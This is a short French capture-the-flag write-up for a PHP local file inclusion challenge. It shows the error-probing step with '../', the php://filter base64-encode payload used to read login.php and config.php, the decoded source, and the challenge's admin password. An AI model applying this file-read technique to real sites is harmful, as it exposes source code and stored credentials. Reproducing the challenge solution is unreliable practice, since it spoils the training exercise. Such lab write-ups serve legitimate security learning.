exemple: https://hackademics.fr/forum/hacking-connaissances-avanc%C3%A9es/remote-web/failles/5554-lfi-php-filter-connexion-mysql-dump-database

1. les pages incluent des fichiers à l'extension .php ?
→ login → /?inc=login.php

2. test error en remplaçant '/?inc=login.php' par '/?inc=../'
→ 
```
Warning: include(): open_basedir restriction in effect. File(/challenge/web-serveur) is not within the allowed path(s): (/challenge/web-serveur/ch12:/tmp) in /challenge/web-serveur/ch12/ch12.php on line 26

Warning: include(/challenge/web-serveur): failed to open stream: Operation not permitted in /challenge/web-serveur/ch12/ch12.php on line 26

Warning: include(): Failed opening '../' for inclusion (include_path='.:/usr/share/php') in /challenge/web-serveur/ch12/ch12.php on line 26
```

3. changer '/?inc=login.php' en '/?inc=php://filter/convert.base64-encode/resource=login.php'

4. decoder la réponse avec un decodeur de base 64 https://www.base64decode.org/
→  
```
PD9waHAKaW5jbHVkZSgiY29uZmlnLnBocCIpOwoKaWYgKCBpc3NldCgkX1BPU1RbInVzZXJuYW1lIl0pICYmIGlzc2V0KCRfUE9TVFsicGFzc3dvcmQiXSkgKXsKICAgIGlmICgkX1BPU1RbInVzZXJuYW1lIl09PSR1c2VybmFtZSAmJiAkX1BPU1RbInBhc3N3b3JkIl09PSRwYXNzd29yZCl7CiAgICAgIHByaW50KCI8aDI+V2VsY29tZSBiYWNrICE8L2gyPiIpOwogICAgICBwcmludCgiVG8gdmFsaWRhdGUgdGhlIGNoYWxsZW5nZSB1c2UgdGhpcyBwYXNzd29yZDxici8+PGJyLz4iKTsKICAgIH0gZWxzZSB7CiAgICAgIHByaW50KCI8aDM+RXJyb3IgOiBubyBzdWNoIHVzZXIvcGFzc3dvcmQ8L2gyPjxiciAvPiIpOwogICAgfQp9IGVsc2Ugewo/PgoKPGZvcm0gYWN0aW9uPSIiIG1ldGhvZD0icG9zdCI+CiAgTG9naW4mbmJzcDs8YnIvPgogIDxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJ1c2VybmFtZSIgLz48YnIvPjxici8+CiAgUGFzc3dvcmQmbmJzcDs8YnIvPgogIDxpbnB1dCB0eXBlPSJwYXNzd29yZCIgbmFtZT0icGFzc3dvcmQiIC8+PGJyLz48YnIvPgogIDxici8+PGJyLz4KICA8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iY29ubmVjdCIgLz48YnIvPjxici8+CjwvZm9ybT4KCjw/cGhwIH0gPz4= 
```

→ devient

```
<?php
include("config.php");

if ( isset($_POST["username"]) && isset($_POST["password"]) ){
    if ($_POST["username"]==$username && $_POST["password"]==$password){
      print("<h2>Welcome back !</h2>");
      print("To validate the challenge use this password<br/><br/>");
    } else {
      print("<h3>Error : no such user/password</h2><br />");
    }
} else {
?>
```

→ on remarque un include("config.php");

3. changer login.php par config.php en '/?inc=php://filter/convert.base64-encode/resource=config.php'

```
PD9waHAKCiR1c2VybmFtZT0iYWRtaW4iOwokcGFzc3dvcmQ9IkRBUHQ5RDJta3kwQVBBRiI7Cgo/Pg== 
```

on decode en base 64 et on obtient
```
<?php

$username="admin";
$password="DAPt9D2mky0APAF";

?>
```